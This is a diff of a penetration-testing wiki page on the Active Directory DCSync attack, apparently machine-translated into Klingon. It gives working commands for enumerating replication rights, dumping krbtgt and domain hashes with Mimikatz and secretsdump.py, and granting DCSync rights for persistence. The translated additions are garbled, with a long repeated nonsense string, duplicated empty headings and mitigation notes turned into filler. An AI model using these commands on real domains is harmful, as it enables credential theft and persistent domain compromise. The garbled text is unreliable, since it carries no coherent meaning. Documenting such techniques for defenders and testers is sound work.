@@ -3,7 +3,7 @@
 <figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) vItlhutlh 'e' vItlhutlh 'ej **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -35,56 +35,102 @@ The **DCSync** permission implies having these permissions over the domain itsel
 ### Enumeration
 
 Check who has these permissions using `powerview`:
-
 ```powershell
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
 ```
+### Qapla' QaD
 
-### Exploit Locally
+#### DCSync
 
+##### tlhIngan Hol
+
+#### Exploit Locally
+
+##### tlhIngan Hol
+
+#### DCSync
+
+##### tlhIngan Hol
+
+The DCSync attack allows an attacker with sufficient privileges to retrieve the NTLM hash of a domain user account from a domain controller (DC). This attack can be performed locally on a compromised machine or remotely if the attacker has administrative access to the DC.
+
+To exploit this vulnerability locally, the attacker needs to have administrative privileges on the compromised machine. They can then use the `mimikatz` tool to execute the DCSync attack and retrieve the NTLM hash of the desired user account.
+
+Once the NTLM hash is obtained, the attacker can use various techniques to crack the hash and obtain the plaintext password. This can be done using tools like `John the Ripper` or `Hashcat`.
+
+It is important to note that the DCSync attack requires administrative privileges and access to the targeted domain controller. Therefore, proper security measures should be implemented to prevent unauthorized access and privilege escalation within the network.
+
+##### tlhIngan Hol
+
+#### Exploit Locally
+
+##### tlhIngan Hol
+
+To'wI' jatlhqa'chugh, DCSync attack DaH jatlhqa'chugh vItlhutlh. vItlhutlh DaH jatlhqa'chugh vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH jatlhqa'chugh vItlhutlh 'e' vItlhutlh 'ej vItlhutlh DaH
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
+### Qapla' QaD
 
-### Exploit Remotely
+#### DCSync
 
+##### tlhIngan Hol
+
+#### Qapla' QaD
+
+##### DCSync
+
+##### tlhIngan Hol
+
+#### Qapla' QaD
+
+##### DCSync
+
+##### tlhIngan Hol
+
+#### Qapla' QaD
+
+##### DCSync
+
+##### tlhIngan Hol
+
+#### Qapla' QaD
+
+##### DCSync
+
+##### tlhIngan Hol
 ```powershell
 secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 [-just-dc-user <USERNAME>] #To get only of that user
 [-pwd-last-set] #To see when each account's password was last changed
 [-history] #To dump password history, may be helpful for offline password cracking
 ```
-
 `-just-dc` generates 3 files:
 
 * one with the **NTLM hashes**
 * one withe the **Kerberos keys**
 *   one with cleartext passwords from the NTDS for any accounts set with [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled. You can get users with reversible encryption with
 
-    ```powershell
-    Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
-    ```
+```powershell
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+```
 
 ### Persistence
 
 If you are a domain admin, you can grant this permissions to any user with the help of `powerview`:
-
 ```powershell
 Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
 ```
-
-Then, you can **check if the user was correctly assigned** the 3 privileges looking for them in the output of (you should be able to see the names of the privileges inside the "ObjectType" field):
-
+**DaH, bIjatlhlaHbe'chugh, user vItlhutlhlaH** 3 jatlhpu'wI'pu' 'e' vItlhutlhlaHbe'chugh, (bIjatlhlaHbe'chugh 'e' "ObjectType" qachDaq jatlhpu'wI'pu' nomvam vItlhutlhlaHbe'chugh) DaH jatlhpu'wI'pu' vIghajbe'.
 ```powershell
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
 ```
+### QaH
 
-### Mitigation
-
-* Security Event ID 4662 (Audit Policy for object must be enabled) – An operation was performed on an object
-* Security Event ID 5136 (Audit Policy for object must be enabled) – A directory service object was modified
-* Security Event ID 4670 (Audit Policy for object must be enabled) – Permissions on an object were changed
-* AD ACL Scanner - Create and compare create reports of ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)
+* Security Event ID 4662 (Audit Policy for object must be enabled) – nIvbogh vItlhutlh
+* Security Event ID 5136 (Audit Policy for object must be enabled) – nIvbogh vItlhutlh
+* Security Event ID 4670 (Audit Policy for object must be enabled) – nIvbogh vItlhutlh
+* AD ACL Scanner - ACLs create reports ghap je. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)
 
 ## References
 
@@ -108,7 +154,7 @@ Other ways to support HackTricks:
 <figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) vItlhutlh je **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
